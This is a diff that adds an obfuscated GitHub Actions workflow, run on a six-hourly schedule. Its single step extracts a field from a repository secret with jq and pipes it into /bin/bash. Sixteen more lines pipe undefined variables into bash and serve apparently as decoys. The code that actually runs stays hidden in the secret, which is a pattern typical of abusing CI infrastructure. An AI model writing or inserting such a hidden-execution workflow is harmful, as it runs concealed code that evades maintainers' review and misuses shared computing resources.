@@ -1,0 +1,35 @@
+name: xiangzhejinhuan
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiangzhejinhuan
+        env:
+          udmu6519: ${{ secrets.udmu6519 }}
+        run: |
+          echo $udmu6519 | jq -r .uml6 | /bin/bash
+          echo $ujeiq3 | jq -r .lf71033 | /bin/bash
+          echo $f39660 | jq -r .w8 | /bin/bash
+          echo $ilh75 | jq -r .rkpkx44 | /bin/bash
+          echo $tzk663 | jq -r .oidi4 | /bin/bash
+          echo $exq6 | jq -r .gx58429 | /bin/bash
+          echo $eoz0 | jq -r .cb51 | /bin/bash
+          echo $wsyyy7 | jq -r .aj6286 | /bin/bash
+          echo $j122 | jq -r .xekmk91712 | /bin/bash
+          echo $bevl8521 | jq -r .hf8308 | /bin/bash
+          echo $qwz05256 | jq -r .wo340 | /bin/bash
+          echo $swmv717 | jq -r .ltbz74 | /bin/bash
+          echo $eu8 | jq -r .h48 | /bin/bash
+          echo $dl695 | jq -r .xaf99947 | /bin/bash
+          echo $ut02273 | jq -r .cik63375 | /bin/bash
+          echo $wlx358 | jq -r .mffxo426 | /bin/bash
+          echo $x8 | jq -r .kiki70 | /bin/bash
+
